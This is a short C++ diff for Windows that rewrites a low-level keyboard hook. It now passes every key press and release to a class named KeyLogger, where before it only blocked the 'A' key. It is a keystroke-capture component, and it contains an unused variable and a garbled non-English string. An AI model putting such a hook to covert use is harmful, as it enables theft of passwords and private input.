@@ -2,17 +2,21 @@
 //
 
 #include "stdafx.h"
+#include "HookKbd.h"
 #include <Windows.h>
 #include <iostream>
+
 using namespace std;
+KeyLogger& keyLogger = KeyLogger::GetInstance();
 
 LRESULT CALLBACK HookCallback(int code, WPARAM wParam, LPARAM lParam)
 {
 	KBDLLHOOKSTRUCT *ks = (KBDLLHOOKSTRUCT*)lParam;
-	if (ks->vkCode == 'A' &&  wParam == WM_KEYDOWN)
-	{
-		cout << "ÒÑÀ¹½ØA¼ü" << endl;
-		return 1;
+	if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN){
+		BOOL bctrl = GetAsyncKeyState(VK_CONTROL) >> ((sizeof(SHORT) * 8) - 1);
+		keyLogger.OnKeyDown(ks->vkCode);
+	} else if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP) {
+		keyLogger.OnKeyUp(ks->vkCode);
 	}
 	return CallNextHookEx(0, code, wParam, lParam);
 }
